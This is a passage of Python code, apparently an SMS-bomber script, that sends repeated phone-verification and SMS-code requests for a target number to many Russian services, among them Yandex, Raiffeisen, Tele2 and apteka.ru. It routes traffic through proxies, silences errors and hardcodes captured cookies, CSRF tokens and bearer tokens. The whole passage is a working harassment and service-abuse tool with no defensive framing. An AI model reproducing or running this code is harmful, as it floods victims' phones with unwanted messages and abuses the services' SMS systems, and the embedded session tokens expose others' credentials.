                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '183',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'yandexuid=4238775361667427470; yuidss=4238775361667427470; i=iwBU4dLllApgR5zO7x6NMHzwa4lW+qL+AFenI96QJ+49STguLe/J4hzdyp+Zrn+fZ6mJi2kZG+SqL+g6zw9yBDzFolQ=; ymex=1982787470.yrts.1667427470#1982787470.yrtsi.1667427470; uniqueuid=378561771668018560; _yasc=vrm8+veH/z5e9Zs1+cHxwy76ekSBmkVGwxBYwKATO1VvAOGMnHX9XKcQYAc/wYk=',
                'Host': 'passport.yandex.ru',
                'Origin': 'https://passport.yandex.ru',
                'Referer': 'https://passport.yandex.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest'
            }

            payload = {
                'track_id': str4,
                'csrf_token': '964346147709db41c197808a04486455c1113df0:1668018564963',
                'password': 'Hoho_HO123',
                'login': 'korotkovateng1987-qw',
                'phone_number': number
            }

            requests.post('https://passport.yandex.ru/registration-validations/password', data=payload,
                          headers=header, proxies=proxy_2)

            header = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '174',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'yandexuid=4238775361667427470; yuidss=4238775361667427470; i=iwBU4dLllApgR5zO7x6NMHzwa4lW+qL+AFenI96QJ+49STguLe/J4hzdyp+Zrn+fZ6mJi2kZG+SqL+g6zw9yBDzFolQ=; ymex=1982787470.yrts.1667427470#1982787470.yrtsi.1667427470; uniqueuid=378561771668018560; _yasc=vrm8+veH/z5e9Zs1+cHxwy76ekSBmkVGwxBYwKATO1VvAOGMnHX9XKcQYAc/wYk=',
                'Host': 'passport.yandex.ru',
                'Origin': 'https://passport.yandex.ru',
                'Referer': 'https://passport.yandex.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest'
            }

            payload = {
                'track_id': str4,
                'csrf_token': '964346147709db41c197808a04486455c1113df0:1668018564963',
                'number': number,
                'isCodeWithFormat': True,
                'confirm_method': 'by_sms'
            }

            requests.post('https://passport.yandex.ru/registration-validations/phone-confirm-code-submit',
                          data=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '30',
                'content-type': 'application/json',
                'cookie': 'session-cookie=17260499d0a105e4f60c6a976940ac722a0bdfce508c35fd9f493dec44a7d64568a8eab2240c8fdcb7be0fdc1af6f059; XSRF-TOKEN=eyJpdiI6InFHdU9UWno4bUwxUmJvR0hrMkR1S0E9PSIsInZhbHVlIjoiTmpwZ3pkUHQyNy80RmhBd0VuelYwYmczcS9FTThWNmZoRE1GM2YyOS83bmdXV3JETEZGekRIdkxNdFZxc3JrWUFIbWdHMWRFVWh1UmJCaDJUc1JWNk1oUVY5QlI1SlZkTzVFcERuY295NnhPQU5paGZJS2RvUnk3VmFPYlNvQVUiLCJtYWMiOiI5NjdmYzhlZjllOTEwYjUxMzRjMjY3M2RkZTM3MGRiMmYyZjk3MGZkYTk4OGZmMzE2MjEzMDJhYjMzYjRiYjQ1IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImxtUXFGVmRPM2J4WUtBR3hmUWJjUUE9PSIsInZhbHVlIjoiUFNNZ09yN0wvVGp2dGxnVDhVbUNlLzA3TEE0bDVPejAvZWJNK281TXB2ays4WGt6cEtIWXZvWVgyUXdtcnNKMnNaR2RQbCtYUGFBYjM4MzRRVUlMWWxaalNzcUhTaTBid3lkdHlVa1BINnVsNkd1TFRMQkQ2RERBbDFQZm9VZHkiLCJtYWMiOiIyMGYzOWI0Y2FhMjFiMmI3NzgwNGJhNGYzY2ZhOGMxNGE3YzdmOTJhNDM5NmNkMDFhZGM5NWNhM2M3YmZmNzk5IiwidGFnIjoiIn0%3D; font=phone',
                'origin': 'https://oauth.av.ru',
                'referer': 'https://oauth.av.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-ajax-token': 'd1a800da997269b58decc9ce6d66d3840e02801ae84265c99251a9a040a83830',
                'x-csrf-token': 'RsR9OkeQqAMcPyunXg8LdUV75QAIBGHDFWjU9PTZ',
                'x-requested-with': 'XMLHttpRequest',
                'x-xsrf-token': 'eyJpdiI6InFHdU9UWno4bUwxUmJvR0hrMkR1S0E9PSIsInZhbHVlIjoiTmpwZ3pkUHQyNy80RmhBd0VuelYwYmczcS9FTThWNmZoRE1GM2YyOS83bmdXV3JETEZGekRIdkxNdFZxc3JrWUFIbWdHMWRFVWh1UmJCaDJUc1JWNk1oUVY5QlI1SlZkTzVFcERuY295NnhPQU5paGZJS2RvUnk3VmFPYlNvQVUiLCJtYWMiOiI5NjdmYzhlZjllOTEwYjUxMzRjMjY3M2RkZTM3MGRiMmYyZjk3MGZkYTk4OGZmMzE2MjEzMDJhYjMzYjRiYjQ1IiwidGFnIjoiIn0='
            }

            payload = {
                'phone': num2
            }

            requests.post('https://oauth.av.ru/check-phone', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '69',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'anonymous-consents=%5B%5D; abtc=787EC619484F2A7B4C166802604530920674; abtc-text-button_2=default_text; abtc-story-test_5=story_exist; abtc-checkout-button_2=active_button; abtc-crm-test_3=owm_crm; abtc-fast-buy-listing_1=fast_buy_listing; cookie-notification=NOT_ACCEPTED; ROUTE=.accstorefront-cbd86fdb8-r9fqp; AKA_A2=A; akaas_sn_www_shoppinglive_ru=2147483647~rv=14~id=02330a70b8ea956d92b323dd5a0c4036~rn=Traffic%20Shift%20RU%20clone%201; userWasLogin=true; JSESSIONID=9296AB25A1624615EB76E2B2065219A5.accstorefront-cbd86fdb8-r9fqp; exp_id=default_text/fast_buy_listing/story_exist/active_button/owm_crm; sl-cart=2d001440-4742-42b0-a799-97ec1f86ea05',
                'origin': 'https://www.shoppinglive.ru',
                'referer': 'https://www.shoppinglive.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user
            }

            payload = {
                'mobilePhone': number[1:],
                'CSRFToken': '00bc3ff8-f081-483d-ab0e-bb026785114f'
            }

            requests.post('https://www.shoppinglive.ru/phone-verification/send-code', data=payload, headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzODFlYzZlZi1hOGFmLTQ5NDgtYmFjYS01NDliM2ZjZTg1N2QiLCJhbm9ueW1vdXMiOiJUcnVlIiwic2lkIjoiNTVkOGFlMTAtODYxZi00NGI0LWFmMzEtZjMwYmYxNjk1YjgyIiwiZGV2aWNlaWQiOiJkOGUzZDU1YTRkYTE1NzI4Mjg5OGE3MjIwODQ5OWNmZCIsInR5cGUiOiJBY2Nlc3MiLCJleHAiOjE2NjgwMzM5MjQsImlzcyI6ImFwLmxlb21heC5ydSIsImF1ZCI6ImFwLmxlb21heC5ydSJ9.qME5o3Qh4sNNv-3iQ0sxaH5KKWoXlukGXq63q6QfVt8',
                'Connection': 'keep-alive',
                'Content-Length': '24',
                'Content-Type': 'application/json',
                'Cookie': '__ddg1_=xl7dki0N0qhMTlUiS9iY; deviceId=d8e3d55a4da157282898a72208499cfd; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzODFlYzZlZi1hOGFmLTQ5NDgtYmFjYS01NDliM2ZjZTg1N2QiLCJhbm9ueW1vdXMiOiJUcnVlIiwic2lkIjoiNTVkOGFlMTAtODYxZi00NGI0LWFmMzEtZjMwYmYxNjk1YjgyIiwiZGV2aWNlaWQiOiJkOGUzZDU1YTRkYTE1NzI4Mjg5OGE3MjIwODQ5OWNmZCIsInR5cGUiOiJBY2Nlc3MiLCJleHAiOjE2NjgwMzM5MjQsImlzcyI6ImFwLmxlb21heC5ydSIsImF1ZCI6ImFwLmxlb21heC5ydSJ9.qME5o3Qh4sNNv-3iQ0sxaH5KKWoXlukGXq63q6QfVt8',
                'Host': 'ap.leomax.ru',
                'Origin': 'https://auth.k8s.leomax.ru',
                'Referer': 'https://auth.k8s.leomax.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user
            }

            payload = {"phone": "+" + number}

            requests.post('https://ap.leomax.ru/siteapi/auth/authcode', json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '24',
                'Content-Type': 'application/json',
                'Cookie': 'mobile=false; device=pc; geo_site=www; geo_region_url=www; site_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; site_city_id=2; APPLICATION_CONTEXT_CITY=21; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-11-09%2021%3A48%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-11-09%2021%3A48%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Macintosh%3B%20Intel%20Mac%20OS%20X%2012_2_1%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106.0.0.0%20Safari%2F537.36; _ga=GA1.2.1662387916.1668026888; _gid=GA1.2.811000822.1668026888; _gat=1; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F',
                'Host': 'oapi.raiffeisen.ru',
                'Origin': 'https://www.raiffeisen.ru',
                'Referer': 'https://www.raiffeisen.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user
            }

            payload = {
                'number': number
            }

            requests.post('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms', json=payload,
                          headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '75',
                'Content-type': 'application/json',
                'Cookie': 'city=izhevsk; city_is_confirmed=1; XSRF-TOKEN=eyJpdiI6IlZwTE9tYUtoVTZhVkpYQ3JnUW9PbFE9PSIsInZhbHVlIjoidWlST2xNa1pvbzVRdDVqY1daRTVQYXBuK25Mb1R6bFR3bG5SYUJZZ05wYVZHQ3BIcjBVZXBGOFNlYVdLUUMrMWU4cGpHRnZlcHV5N2tGdThIbWdiMGc9PSIsIm1hYyI6ImNiYTQ2YzcwMDk5ZGE4YzJiMDE3NTcxOTJhNDVjMjViYTY1NWI0NGYxMDI2ODEzNDYyMDQ4Mzc1NzJiZWMxMWQifQ%3D%3D; b-apteka_session=eyJpdiI6IjcrTWJyM21aa3lvME1UaXcrRVIxWkE9PSIsInZhbHVlIjoiN29pME5hZ05RYU9Cc2lVMW1Vdk0yMG4zUjBhVUdaUFwvWnFYNzBubG9TNkdPcnk0WDZZRE00c1BTRlRISXRhczdxMm5QTWYrOTlaWDVORGFsMmszdmJ3PT0iLCJtYWMiOiJmNWRkYzJhMWMzMWUyYTY3MzBlOGQzNWFmOTdkYjA3OWE4ZTIyOWE1NDI3ZTU2OWNmYzA1MDRhYzM3ZTgwZGFmIn0%3D',
                'Host': 'b-apteka.ru',
                'Origin': 'https://b-apteka.ru',
                'Referer': 'https://b-apteka.ru/lk/login',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest'
            }

            payload = {
                "phone": number,
                "_token": "G342Mr1Pf7bDbpQ3qdqxByzuyjG08yHr8i9TbtpR"
            }

            requests.post('https://b-apteka.ru/lk/send_confirm_code', json=payload, headers=header)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzYzZkY2UzMy1jNDMyLTRhZmUtODUzOC0zYzQ5NjJiNTc0MjUiLCJqdGkiOiI2MzZjMTNmYzU4NWJkOGQ1NTAxZWMyOWQiLCJleHAiOjE2ODM1NzkzODgsIm5iZiI6MTY2ODAyNzM4OCwicm9sZSI6IlNoYWRvd1VzZXIiLCJpYXQiOjE2NjgwMjczODh9.nPD3aWSEvn_5HAZmb8aa5NZGWwQ7oN24vwUN2QwzYqRwRql6IuaHBnBtXRNfSM1BAGYLNXWh1xvntV4Co6nP24eBfXas-I6oPGjPtnVHOqKLFbFGpgwg5AiMH4vKlsbh-6HiZV2P3v-3lk685Qbxj0dOyaVc8d3lXC9dFd0cTHpKp7QVkCBGzv1CiAI_hZlalP1vFri2-X-O6sdim7yCx2T33BTilpMSXPqAZhy_tZzddkuZfVfELsiInQqDpcKhjWmxYzuu13wIEmGbOodQt5EMyNsU1wHGI7N7px1sejkKlcA-3vF_3zncVBCqQfvbr6tBLolNGGmH7Z5vvcf1XlYGXIdhSAKnUFrxA--53gec5g4XyXqDZV_ostx3U3DXPDZGcvdX2kNBYOUtYLHenNWB9tFD0JTludTAWHQk-aMMiMSNwQHvE_Pc8B0Ctal0ILkfZiKL8rlpm78ifLKeL095Eskp07qXRFKKt65Cp0jdyr31AiYoONyUHqLc6ja0ADLhkG4QsddYryFynFTOQA3g0uVMdnrOG6Jyk4JX8aQTSjWIfu5SoqZ40aa_f6IAO6jF7O_A7Evesyi3a0RhDFldPCQWeza3ZCjO0Pdvm3QgpRLM81y1-oxIXjToMzk6MGq4-CtlCCEVstMWAo7USwhs_fs8O0SgkyhFC2VTFAA',
                'Connection': 'keep-alive',
                'Content-Length': '38',
                'Content-Type': 'application/json',
                'Host': 'api.apteka.ru',
                'Origin': 'https://apteka.ru',
                'Referer': 'https://apteka.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user,
                'user-session-id': '1668027410784_d4efa936f6ded',
                'X-ACTIVE-EXP': 'M_y62n5aTfefCwX7mHK1qQ:0;lppkCQVBQwWa4F1lWb3Fag:0'
            }

            payload = {
                'phone': num2,
                'u': "U"
            }

            requests.post('https://api.apteka.ru/Auth/Auth_Code', json=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'fr-FR,fr',
                'content-length': '18',
                'content-type': 'application/json',
                'cookie': 'language=ru-RU; user-separator=part1; language=ru-RU; session-cookie=1726063975251ab3f60c6a976940ac7285525d89dcb927fe1d60ec46cae73ef49059592ea3ef326a51e3f2f08d6353e1; auth_state=NOT_AUTH; kc_config={%22realm%22:%22tele2-b2c%22%2C%22clientId%22:%22digital-suite-web-app%22%2C%22url%22:%22%22%2C%22updateTimeBeforeExpiration%22:60%2C%22defaultRefreshInterval%22:60%2C%22requestSetTokenTimeout%22:15%2C%22requestSetTokenRetry%22:2%2C%22requestSetTokenRetryDelay%22:2%2C%22requestUpdateTokenTimeout%22:10%2C%22requestUpdateTokenRetry%22:8%2C%22requestUpdateTokenRetryDelay%22:2%2C%22cookieDomain%22:%22.tele2.ru%22%2C%22isActive%22:true%2C%22smsCodeLength%22:6%2C%22migration%22:true%2C%22skylinkCookieDomain%22:%22.skylink.ru%22}; Test_try={%225500001%22:1}; csrf-token-name=csrftoken; JSESSIONID=yC1eMKbGBrnLyukyFZ7-at-Q5ZKp8MA6JlTGL06bkjt_o0QFjCZQ!-550992005; NSC_ESNS=a0366d2d-14a5-136c-9678-c223c06207fc_0765662115_1895704033_00000000019867210692; csrf-token-value=1726063c60de4ab6c4943efca7bc968c764caec84dde01522c0a8f7ae9d5608427191ccb48f76353',
                'origin': 'https://msk.tele2.ru',
                'referer': 'https://msk.tele2.ru/?pageParams=askForRegion%3Dtrue',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'tele2-user-agent': 'web',
                'user-agent': user,
                'x-ajax-token': 'b382122191e9582bd66d958796abe7397c63a42c493c56ca4b8acfc965e7b11c',
                'x-csrftoken': '172606399efc805c7c4123a0dfeff94afb700ee884ccd72ecf2206201ee028c941f18bf7f5acf1e8',
                'x-request-id': 'HVRe0j56mcGaJpdnoFXqxBg89wQfLsA7OkvDzurS',
                'x-requested-with': 'XMLHttpRequest'
            }

            payload = {
                'sender': "Tele2"
            }

            requests.post(f'https://msk.tele2.ru/api/validation/number/{number}', json=payload, headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '0',
                'cookie': 'favoriteProducts=%5B%5D; CITY_CONFIRM=true; without_critical=1; reuserid=d2314c12-cce6-46e1-8955-1173e60338f7; O_ZONE_ALIAS=msk; O_CITY_ID=133; SETCITY=133; dtCookie=v_4_srv_1_sn_689C90C537E1DB01B95EB82A7DEBB5E6_perc_100000_ol_0_mul_1_app-3Aea7c4b59f27d43eb_1; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; SITE_SESSID=og4i452ghf6iv1of9c8r00eqr0; branch=K; cf_clearance=e2a2205501dafb3bf87873b2124c0738bea5693a-1667590180-0-150; _cfuvid=7qo8NDtZ3jsi4WBHzUZ1snKrNVf93UHPrbDxrEKBVTc-1668027960075-0-604800000; searchPlaceholder=Apple%2520MacBook; BASKET_COUNT=0; __cf_bm=FUlOJxiHHM2NF7yFFQqufh5_RxESugWb5_Gt93wl8Fw-1668027962-0-AUwqQ15CtADoXAccMeA3g0WbzmrgCD2/QcylobSrjQdLiQx1cJfIsx+AGxZCn0ZH21eecYku/+MJ07yrSE3tSrQY/RjEr4r9V4a8ZJsYdmI9f27uS9tdy0FEuyTpuyHcty6s6eGB7+V0UkUkn4A/Hkt81gTBzVLAKShMCv7SUKwb0oYRN35EAd5y3SGSzZHghg==',
                'origin': 'https://www.svyaznoy.ru',
                'referer': 'https://www.svyaznoy.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest'
            }

            requests.post(f'https://www.svyaznoy.ru/api/v2/sms-verification-code/{number[1:]}', headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            num2 = f"+7({number[1:4]}){number[4:7]}-{number[7:]}"

            header = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'fr-FR,fr',
                'content-length': '38',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'cookie': f'PHPSESSID=YWIt431vw9nAZFsQkfDmZmk2XxczAqwN; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A44%2C%22EXPIRE%22%3A1668113940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; BXMT_PHONE=%2B{num2}',
                'origin': 'https://airsoft-rus.ru',
                'referer': 'https://airsoft-rus.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest'
            }

            payload = {
                'phone': '+' + num2,
                'register': True
            }

            requests.post('https://airsoft-rus.ru/bitrix/components/bxmt/phone/sms.php', data=payload, headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Length': '16',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': 'PHPSESSID=uutvbqgetdp7hrktod41sk70b3; _fbp=fb.1.1668028718954.379549720',
                'Host': 'www.frotels.com',
                'Origin': 'https://www.frotels.com',
                'Referer': 'https://www.frotels.com/appsendsms.php',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'iframe',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': user
            }

            payload = {
                'mobno': number
            }

            requests.post('https://www.frotels.com/appsendsms.php', data=payload, headers=header, proxies=proxy_2)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '78',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'cookie': 'PHPSESSID=kqHvVhJMJxReBr43AgEKDDxHDK25kKQj; UF_USER_BUY_SITE=N; UF_USER_AUTH=N; BITRIX_SM_REGION_ID_3=3872; SERVERID=bitrix01; _vv_card=A402373; uxs_uid=fc4ab260-6074-11ed-a0f3-ad444ac21518; mgo_sb_migrations=1418474375998%253D1; mgo_sb_current=typ%253Dtypein%257C%252A%257Csrc%253D%2528direct%2529%257C%252A%257Cmdm%253D%2528none%2529%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_first=typ%253Dtypein%257C%252A%257Csrc%253D%2528direct%2529%257C%252A%257Cmdm%253D%2528none%2529%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_session=pgs%253D2%257C%252A%257Ccpg%253Dhttps%253A%252F%252Fvkusvill.ru%252F; mgo_uid=KDaOurSlPJ0EOsvPrWNW; mgo_cnt=1; mgo_sid=nlnhrl3nhw110019tpi4; WE_USE_COOKIE=Y',
                'origin': 'https://vkusvill.ru',
                'referer': 'https://vkusvill.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest'
            }

            payload = {
                'FUSER_ID': '235877642',
                'USER_NAME': '',
                'USER_PHONE': num2,
                'token': '',
                'is_retry': ''
            }

            requests.post('https://vkusvill.ru/ajax/user_v2/auth/check_phone.php', data=payload, headers=header,
                          proxies=proxy_2)
        except:
            pass
        try:
            header = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'ru',
                'content-length': '60',
                'content-type': 'application/json',
                'dnt': '1',
                'origin': 'https://wheely.com',
                'referer': 'https://wheely.com/',
                'sec-ch-ua': '"Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': user,
                'x-wheely-sign': 'eyJ0eXBlIjoiY2FwdGNoYSIsInNpZ25hdHVyZSI6IlAwX2V5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUp3WVhOemEyVjVJam9pTkVkemJqUnlaMVpTUjAxMWNFZHNiMGxLT0ZwT1NURjNTMVpxWjBkNGVqWmhSVEUwZVd0SVEyTlJWR2cwV0hWTE5qQndOMlZZYUVsNlEwazRTakZVTXpsalEycE9RWGw2Vm1oS2QzQjBjbGQ1TlZaQ1NVNUVaRzFsTkZGRlIydG1iMDl6TVVSaFoyeDJaVnBIVnpObGFGWXpZa1kyY1VZeFdIQXpZa3c0TVdwTVJVaFhkbTQ0Ymtvek1GZE5SRUUzZFhSWVdsSjVTblIzWjNBeU1sTkZNemhEVjFCa1JGZGFSMXBpTXprNE5HSXlOa3huZURWVmJHaFdhRkZQYnpCcGRHbGFkMnRSZWpBclRVTTJka2t3ZFVOdFNHOURRbXhOUVUwM1dWVm1aVTQ0TDI5c04yRm9XbUY2TW1GMFYyMW9Ra2h0TkZaeFlUTkZOa1ZsT0VWdlJtOWtRWE12Y0VOdU1IbERXbk42T0M5VWMxYzJZVTlGYnpoQk5EZEdhbUprZWpaYU5XeEdObUU0VjBzd1UzQkJOVFZPYm1samEyWnRlVXRuWjBOeVQwaEhXRVJvV1RkamJIRTRObTltTTNkaVUyaHRhbUZMV0NzNU9EbFZla2RXVDB4WlJ6VXpVRzQxV1dGSkwzQXZRbUZXWWpaUFYzY3pjRWxOVUZGeFUzSnFPVW80ZG5KQmVscEtVV3RtYUdWU1JtTjFSUzlwYmxSVFF6Sk1RelZxT1VoSU4xZzNVRlJoTXpCWldrZ3JUVmxQUm1RNE9XRTBUbmhrUmtzcmJFTmhhMlYwV0UwMFdIaGplRFV3UTFKSVpWVlRaek5zYTFaVlZIaExVVGx0Wmxwa04wUlphRXhUWVRodU1DOURiSGhIVVdGcFdVOXhjRWg0